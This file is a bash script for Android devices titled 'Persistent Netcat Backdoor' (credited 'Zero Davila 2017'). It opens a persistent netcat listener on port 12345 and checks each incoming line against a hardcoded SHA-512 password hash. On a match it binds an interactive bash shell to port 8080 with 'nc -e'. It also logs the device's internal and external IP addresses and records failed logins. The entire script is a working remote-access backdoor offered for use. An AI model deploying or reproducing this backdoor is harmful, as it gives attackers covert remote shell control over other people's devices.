#!/data/data/com.spartacusrex.spartacuside/files/system/bin/bash

echo """
    ____                 _      __             __ 
   / __ \___  __________(_)____/ /____  ____  / /_
  / /_/ / _ \/ ___/ ___/ / ___/ __/ _ \/ __ \/ __/
 / ____/  __/ /  (__  ) (__  ) /_/  __/ / / / /_  
/_/    \___/_/  /____/_/____/\__/\___/_/ /_/\__/  
    _   __     __             __ 
   / | / /__  / /__________ _/ /_
  /  |/ / _ \/ __/ ___/ __ \`/ __/
 / /|  /  __/ /_/ /__/ /_/ / /_  
/_/ |_/\___/\__/\___/\__,_/\__/  
    ____             __       __                
   / __ )____ ______/ /______/ /___  ____  _____
  / __  / __ \`/ ___/ //_/ __  / __ \/ __ \/ ___/
 / /_/ / /_/ / /__/ ,< / /_/ / /_/ / /_/ / /    
/_____/\__,_/\___/_/|_|\__,_/\____/\____/_/     
======== Zero Davila 2017 ======================
"""

echo "[-] Moving to sdcard"
cd /sdcard
echo "[-] Checking for persistentNC directory"
if [ ! -d "persistentNC" ]; then
    echo "[-] Not found. Creating persistentNC directory..."
    mkdir persistentNC
else
    echo "[-] Directory found"
fi

NOW=`date`
FAILED=1
EXT_IP=`jping 4.ifcfg.me | grep Address | cut -d' ' -f6`
CLIENT=`netstat | grep 12345 | cut -d' ' -f16 | cut -d':' -f4`

echo
echo "[...] Netcat backdoor active since [$NOW]" >> persistentNC/persistentNCbackdoor.log
echo "[...] Request port [12345]" >> persistentNC/persistentNCbackdoor.log
echo "[...] Shell port [8080]" >> persistentNC/persistentNCbackdoor.log
echo "[...] Internal address [`ifconfig wlan0 | awk '$1 == "inet" {print $2}'`]" >> persistentNC/persistentNCbackdoor.log
echo "[...] External address [`telnet $EXT_IP | grep IPv4 | cut -d' ' -f4`]" >> persistentNC/persistentNCbackdoor.log
cat persistentNC/persistentNCbackdoor.log | tail -n-5
echo

while :
do
    nc -l -p 12345 | while read LINE
    do
        # Default is "Shell-access"
        SHELL_MATCH=$(echo $LINE | sha512sum | grep -c '870c042ce30e4908f0393eeb32b4b05f6644f597ceef71b8e93cf418fac01e5cea81f9a825ca3e5393d108919fa79dc15a27441c3a20af3b8a8d9aa2fb3d71ff')
       
        if [ $SHELL_MATCH -eq 1 ]; then
            echo "[+] Server shell access granted to [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
            cat persistentNC/persistentNCbackdoor.log | tail -n-1
            nc -l -p 8080 -e /data/data/com.spartacusrex.spartacuside/files/system/bin/bash
            echo "[-] Shell access to [$CLIENT] terminated at [$(date)]" >> persistentNC/persistentNCbackdoor.log
            cat persistentNC/persistentNCbackdoor.log | tail -n-1           
            let CONECTIONS++
        else
            echo "[!] WARNING: Failed login atempt number [$FAILED] from [$CLIENT] at [$(date)]" >> persistentNC/persistentNCbackdoor.log
            cat persistentNC/persistentNCbackdoor.log | tail -n-1       
            let FAILED++
        fi
    done
done
